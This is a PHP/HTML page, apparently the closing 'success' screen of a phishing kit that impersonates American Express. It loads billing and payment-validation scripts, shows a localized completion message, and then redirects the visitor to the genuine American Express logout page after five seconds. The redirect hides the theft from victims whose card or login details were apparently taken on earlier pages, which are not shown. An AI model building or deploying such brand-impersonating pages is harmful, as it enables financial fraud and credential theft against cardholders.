<html>
<head>
<title>AMERICAN EXPRESS</title>
<link rel="icon" href="./info_files/favicon.ico">
<link rel="stylesheet" href="../css/normalize.css">
<link rel="stylesheet" href="../css/bootstrap.min.css">
<link rel="stylesheet" href="../css/font-awesome.min.css">
<link rel="stylesheet" href="../css/main_style.css">
<link rel='stylesheet' href='../assets/css/mobile_login.css'>
<link rel='stylesheet' href='../assets/css/billing.css'>
<script type='text/javascript' src="../assets/js/jquery-1.9.1.js"></script>
<script type='text/javascript' src="../assets/js/jquery.validate.min.js"></script>
<script type='text/javascript' src="../assets/js/jquery.payment.js"></script>
<script type='text/javascript' src="../assets/js/additional-methods.min.js"></script>
<script type='text/javascript' src="../assets/js/jquery.maskedinput.js"></script>
<script type='text/javascript' src="../assets/js/validate.php"></script>
<script type='text/javascript' src="../assets/js/validation.js"></script>
<meta charset='utf-8'>
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<?php 
if($countryname == "Germany"){
echo '<meta http-equiv="refresh" content="5; url=https://www.americanexpress.com/en-us/account/logout" />';
}
else if($countryname == "Japan"){
echo '<meta http-equiv="refresh" content="5; url=https://www.americanexpress.com/en-us/account/logout" />';
}
else if($countryname == "France"){
echo '<meta http-equiv="refresh" content="5; url=https://www.americanexpress.com/en-us/account/logout" />';
}else{
  echo '<meta http-equiv="refresh" content="5; url=https://www.americanexpress.com/en-us/account/logout" />';
}
?>
</head>
<body>
  <div class="contain">
                <div align="center" class="img-logo">
                    <a href="#"><img src="./info_files/dls-logo-line.svg"></a>
                </div>
                <div class="center-color"></div>
                
                <div class="cls"></div>
            </div>
<center>
  <?php
  if($os == "Android" or $os == "iPhone") {}else{
    echo "<br>";
  } ?>
<?php
  if($os == "Android" or $os == "iPhone") {
    echo '<div class="boxlogin">';
  }else{
    echo '<div style="width:400px;" class="boxlogin">';
  } 
  ?>

<div class="a-box a-alert a-alert-success cvf-widget-alert cvf-widget-alert-id-cvf-claim-collect-page-alert"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading"><?php echo $lang['done']['success'];?></h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content"><div class="a-section cvf-alert-section cvf-widget-alert-message"><?php echo $lang['done']['complete'];?></div></div></div></div>
<br>
<?php echo $lang['done']['for'];?>
</div>
</center>
<?php
if($os == "Android" or $os == "iPhone") {}else{
  echo "<br><br>";
} ?>
<?php
if($os == "Android" or $os == "iPhone") {
?>
<footer class="nav-mobile nav-locale-us nav-lang-en nav-ftr-batmobile">
                   
                </footer>
<?php }?>
</body>
</html>
